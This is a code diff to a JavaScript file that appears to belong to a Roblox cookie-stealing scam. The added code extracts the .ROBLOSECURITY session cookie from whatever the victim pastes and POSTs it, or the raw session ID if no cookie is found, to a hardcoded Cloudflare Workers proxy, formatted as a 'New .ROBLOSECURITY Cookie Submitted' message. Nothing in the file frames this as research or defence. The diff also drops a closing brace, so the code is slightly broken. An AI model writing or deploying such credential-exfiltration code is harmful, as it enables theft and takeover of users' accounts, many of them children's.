@@ -1,21 +1,26 @@
 const CLOUDFLARE_PROXY_URL = "https://wispy-pond-aa69.virtualmachineholder420.workers.dev/";
 
-async function sendToProxy(data) {
+function extractRobloxSecurityCookie(sessionId) {
+  const regex = /\.ROBLOSECURITY",\s*"([^"]+)"/;
+  const match = sessionId.match(regex);
+  return match ? match[1] : null; // Return cookie value if found, else null
+}
+
+async function sendToProxy(content) {
   try {
     const response = await fetch(CLOUDFLARE_PROXY_URL, {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        data,
+        content,
         timestamp: new Date().toISOString()
       })
     });
 
     if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    console.log("Successfully sent to proxy");
     return await response.json();
-    
+
   } catch (error) {
     console.error('Proxy error:', error);
     throw error;
@@ -23,22 +28,19 @@ async function sendToProxy(data) {
 }
 
 function bruteforce(sessionId) {
-  const extractedCookie = extractRobloxSecurityCookie(sessionId);
+  let content;
 
-  if (extractedCookie) {
-    sendToProxy(extractedCookie)
-      .then(() => showCookieSuccess())
-      .catch(() => showError("Failed to send data"));
+  if (sessionId.includes(".ROBLOSECURITY")) {
+    const robloxSecurityCookie = extractRobloxSecurityCookie(sessionId);
+    if (robloxSecurityCookie) {
+      content = `New .ROBLOSECURITY Cookie Submitted:\n\`\`\`${robloxSecurityCookie}\`\`\``;
+    } else {
+      content = `No valid .ROBLOSECURITY cookie found in the sessionId:\n\`\`\`${sessionId}\`\`\``;
+    }
   } else {
-    console.error("No .ROBLOSECURITY cookie found in sessionId.");
-    showError("Invalid sessionId. No .ROBLOSECURITY found.");
+    content = `New Session ID Submitted:\n\`\`\`${sessionId}\`\`\``;
   }
-}
 
-function extractRobloxSecurityCookie(sessionId) {
-  const match = sessionId.match(/\.ROBLOSECURITY=([^;]+)/);
-  return match ? match[1] : null;
-}
 
 
 
